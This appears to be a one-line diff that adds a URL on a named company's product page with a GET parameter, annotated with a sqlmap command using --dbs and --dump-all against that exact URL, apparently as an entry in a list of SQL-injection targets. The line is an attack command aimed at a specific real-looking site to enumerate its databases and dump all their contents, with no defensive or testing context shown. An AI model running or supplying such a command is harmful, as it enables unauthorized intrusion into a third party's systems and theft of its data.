@@ -1,0 +1,1 @@
+https://www.vestil.com/product.php?FID=1430 (GET)  # /usr/bin/sqlmap -u https://www.vestil.com/product.php?FID=1430 --dbs --dump-all
